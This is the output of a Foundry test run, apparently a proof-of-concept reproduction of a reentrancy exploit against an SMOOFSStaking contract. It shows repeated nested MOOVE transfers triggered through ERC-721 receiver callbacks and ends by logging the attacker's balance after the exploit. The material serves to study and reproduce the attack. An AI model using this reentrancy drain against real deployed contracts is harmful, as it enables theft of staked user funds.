    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 57200000000000000000000 [5.72e22]
    тФВ   тФФтФА тЖР [Return] 57200000000000000000000 [5.72e22]
    тФЬтФА [834] MOOVE::decimals() [staticcall]
    тФВ   тФЬтФА [389] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::decimals() [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФФтФА тЖР [Return] 18
    тФЬтФА emit log_named_decimal_uint(key: "Attacker MOOVE balance after exploit", val: 57200000000000000000000 [5.72e22], decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 320.97s (320.36s CPU time)

Ran 2 test suites in 320.98s (321.27s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
